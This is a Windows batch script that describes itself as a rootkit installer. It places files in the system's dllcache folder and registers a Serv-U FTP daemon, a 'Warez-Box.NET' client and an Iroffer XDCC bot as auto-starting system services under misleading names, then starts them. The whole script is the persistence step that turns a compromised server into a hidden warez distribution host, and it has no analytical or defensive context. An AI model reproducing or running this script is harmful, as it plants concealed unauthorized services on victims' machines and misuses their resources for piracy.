@echo off
echo Setting Environment Variable for Rootkit's Root Folder
set MXBIN=C:\winnt\system32\dllcache

echo
echo Installing Serv-U Daemon as a System Service..
c:\winnt\system32\dllcache\mssvc -i runbatch "C:\WINNT\system32\dllcache" "C:\WINNT\system32\dllcache\runbatch.exe" "/u" Y 0 0 N Y
echo
echo Installing Warez-BOX.NET Client as a System Service..
c:\winnt\system32\dllcache\mssvc -i asnetclient "C:\WINNT\system32\dllcache" "C:\WINNT\system32\dllcache\asnetclt.exe" "/u" Y 0 0 N Y
echo
echo Installing Iroffer Bot as a System Service..
c:\winnt\system32\dllcache\mssvc -i ntsysvers "C:\WINNT\system32\dllcache" "C:\WINNT\system32\dllcache\userlist.exe" "xdcc.config" Y 0 0 N Y
echo
echo Starting Service: "Warez-Box.NET Client"
net start asnetclient
echo Starting Service: "Serv-U"..
net start runbatch
echo Starting Service: "Iroffer" ..
net start ntsysvers
